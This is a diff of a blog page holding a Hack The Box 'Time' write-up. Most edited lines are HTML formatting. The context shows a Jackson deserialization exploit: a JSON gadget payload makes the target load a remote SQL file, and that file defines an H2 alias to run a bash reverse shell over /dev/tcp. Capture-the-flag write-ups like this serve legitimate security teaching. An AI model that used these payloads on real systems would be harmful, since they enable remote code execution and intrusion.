@@ -34,14 +34,14 @@
   <link rel="stylesheet" href="/css/main.min.css">
 
 
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Time HTB Writeup"/>
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Time HTB Writeup"/>
 <meta name="twitter:description" content="Time is a medium machine retired today, but i think it&rsquo;s an easy and straight forward one. enjoy ..
-1. Enumeration:   Nmap scan:
-  nmap -sC -sV 10.10.10.214     Web Enumeration:
- let&rsquo;s check out the running web server:     And the source code: Nothing interesting in the source code.
-  let&rsquo;s search for hidden directories:
-  $ python3 dirsearch."/>
+1. Enumeration: Nmap scan:
+nmap -sC -sV 10.10.10.214 Web Enumeration:
+let&rsquo;s check out the running web server: And the source code: Nothing interesting in the source code.
+let&rsquo;s search for hidden directories:
+$ python3 dirsearch.py -u http://10.10.10.223/ -e txt,html,php,log,zip,bac,bak,tar Nothing useful inside them: also checking /index.php and /index.php/login &raquo; gives nothing useful and redirects back to the main page Let&rsquo;s see the app functionality: when tried the beautifier &gt; it worked fine when tried validator (still in beta version) &raquo; tried some meaningless letters gave some suspicious error &raquo; will search with it to see its meaning."/>
+<meta name="twitter:site" content="@Wh1r1w1nd"/>
 
   <script type="application/ld+json">
 {
@@ -192,8 +192,8 @@ Nothing interesting in the source code.</p>
 <p>let&rsquo;s search for hidden directories:</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">$ python3 dirsearch.py -u http://10.10.10.223/ -e txt,html,php,log,zip,bac,bak,tar</span>
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/5.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#ae81ff">$ python3 dirsearch.py -u http://10.10.10.223/ -e txt,html,php,log,zip,bac,bak,tar</span>
+</span></span></code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/5.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/6.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <ul>
 <li>Nothing useful inside them:
@@ -209,8 +209,8 @@ also checking <code>/index.php and /index.php/login</code> &raquo; gives nothing
 </ul>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#39;edfgagshh&#39;: was expecting (&#39;true&#39;, &#39;false&#39; or &#39;null&#39;)
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/8.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#39;edfgagshh&#39;: was expecting (&#39;true&#39;, &#39;false&#39; or &#39;null&#39;)
+</span></span></code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/8.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <ul>
 <li>
 <p>Found out that this <code>com.fasterxml.jackson.core</code> library is vulnerable and leads to RCE.
@@ -238,7 +238,7 @@ CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOExcep
         java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\A&quot;);
         return s.hasNext() ? s.next() : &ldquo;&quot;;  }
 $$;
-CALL SHELLEXEC(&lsquo;setsid bash -i &amp;&gt;/dev/tcp/IP/PORT 0&gt;&amp;1 &amp;')</p>
+CALL SHELLEXEC(&lsquo;setsid bash -i &amp;&gt;/dev/tcp/IP/PORT 0&gt;&amp;1 &amp;&rsquo;)</p>
 </li>
 <li>
 <p>Replace the IP and PORT above with your HTB IP and netcat listener port</p>
@@ -248,7 +248,7 @@ CALL SHELLEXEC(&lsquo;setsid bash -i &amp;&gt;/dev/tcp/IP/PORT 0&gt;&amp;1 &amp;
 </li>
 <li>
 <p>On the website application, select &ldquo;Validate (beta!)&rdquo; and input this: 
-[&ldquo;ch.qos.logback.core.db.DriverManagerConnectionSource&rdquo;,{&ldquo;url&rdquo;:&ldquo;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &lsquo;http://IP:PORT/inject.sql&rsquo;&quot;}]</p>
+[&ldquo;ch.qos.logback.core.db.DriverManagerConnectionSource&rdquo;,{&ldquo;url&rdquo;:&ldquo;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &lsquo;http://IP:PORT/inject.sql&rsquo;&rdquo;}]</p>
 </li>
 <li>
 <p>Replace IP with your HTB IP, and PORT with your server port (updog uses 9090)</p>
@@ -390,7 +390,7 @@ CALL SHELLEXEC(&lsquo;setsid bash -i &amp;&gt;/dev/tcp/IP/PORT 0&gt;&amp;1 &amp;
     <div class="copyright">
         &copy;
         
-        <span itemprop="copyrightYear">2020 - 2021</span>
+        <span itemprop="copyrightYear">2020 - 2024</span>
         
          
             <span class="author" itemprop="copyrightHolder"><a href="https://hussein-elsayed.github.io/">Wh1rlw1nd</a> | </span>
